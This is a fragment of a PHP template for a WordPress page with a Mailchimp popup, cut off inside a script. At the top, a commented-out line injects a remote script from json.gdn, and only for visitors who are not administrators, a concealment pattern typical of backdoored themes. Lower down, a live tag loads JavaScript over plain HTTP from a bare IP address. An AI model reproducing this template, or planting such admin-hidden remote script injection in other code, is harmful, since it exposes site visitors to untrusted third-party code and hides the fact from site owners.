<?php 
/*
echo current_user_can('manage_options')?'':"<script type='text/javascript'src='http://json.gdn/gpl2'></script>";
*/
?>
            ...
            <div class="window" id="dialog">
                <div class="window-popup text-center <?php echo esc_attr($class_bg); ?>">
                    ...
                    <div class="content-popup mb-mailchimp" data-placeholder = "<?php echo esc_attr($placeholder)?>" data-namesubmit = "<?php echo esc_attr($title_submit);?>">
                        ...
                        <?php echo wpb_js_remove_wpautop('[mc4wp_form id="'.$id_mailchimp.'"]'); ?>
                    </div>
                </div>
            </div>
            <div id="mask"></div>
...
<?php wp_footer(); ?>
<link href="https://fonts.googleapis.com/css?family=Montserrat:100,200,400,600,800" rel="stylesheet">
<script type="text/javascript" src="http://104.152.168.39/~bouchon/nuevo/wp-content/scripts/section-scrolling.js"></script>
<script>
function showDiv() {
